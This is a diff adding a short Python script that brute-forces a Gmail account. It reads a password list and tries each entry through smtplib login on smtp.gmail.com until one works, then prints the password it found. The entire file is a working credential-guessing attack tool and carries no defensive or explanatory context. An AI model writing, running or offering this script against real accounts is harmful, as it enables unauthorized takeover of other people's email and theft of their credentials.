@@ -1,0 +1,31 @@
+import smtplib
+from email.mime.text import MIMEText
+
+def attempt_login(email, password):
+    try:
+        server = smtplib.SMTP('smtp.gmail.com', 587)
+        server.starttls()
+        server.login(email, password)
+        return True
+    except smtplib.SMTPAuthenticationError:
+        return False
+    finally:
+        server.quit()
+
+def main():
+    email = input("Enter the email address: ")
+    password_file = input("Enter the path to the password list: ")
+
+    with open(password_file, 'r') as file:
+        passwords = file.readlines()
+
+    for password in passwords:
+        password = password.strip()
+        if attempt_login(email, password):
+            print(f"Password found: {password}")
+            break
+    else:
+        print("No valid password found.")
+
+if __name__ == "__main__":
+    main()
